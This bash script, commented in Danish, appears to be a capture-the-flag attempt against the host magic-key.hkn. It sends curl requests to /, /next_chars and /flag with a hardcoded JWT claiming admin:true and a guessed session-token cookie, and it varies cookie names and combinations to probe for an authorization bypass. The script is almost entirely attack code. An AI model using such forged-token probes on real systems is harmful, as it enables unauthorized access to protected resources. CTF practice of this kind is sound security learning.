#!/bin/bash
JWT2="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidGltZXN0YW1wIjoxMzAwMDAwMDAwfQ.d-H00PqEmUozSDiQxSRWBYeyIqvuaTifVVBHlKaE2Wc"
STOKEN="very-good-session-token"

echo "### 1) JWT som cookie ###"
for path in "/" "/next_chars" "/flag"; do
  echo "=== GET $path med Cookie: JWT=... ==="
  curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn${path}" \
    -H "Cookie: JWT=$JWT2"
  echo ""; echo "---"
done

echo ""
echo "### 2) Session-Token som cookie ###"
for path in "/" "/next_chars" "/flag"; do
  echo "=== GET $path med Cookie: Session-Token=... ==="
  curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn${path}" \
    -H "Cookie: Session-Token=$STOKEN"
  echo ""; echo "---"
done

echo ""
echo "### 3) Begge som cookies samtidig ###"
for path in "/" "/next_chars" "/flag"; do
  echo "=== GET $path med begge cookies ==="
  curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn${path}" \
    -H "Cookie: JWT=$JWT2; Session-Token=$STOKEN"
  echo ""; echo "---"
done

echo ""
echo "### 4) Lowercase cookie-navne ###"
for path in "/next_chars" "/flag"; do
  echo "=== GET $path med lowercase cookie-navne ==="
  curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn${path}" \
    -H "Cookie: jwt=$JWT2; session-token=$STOKEN; session_token=$STOKEN"
  echo ""; echo "---"
done

echo ""
echo "### 5) next_chars med char=s OG JWT som cookie ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn/next_chars?char=s" \
    -H "Cookie: JWT=$JWT2"
echo ""
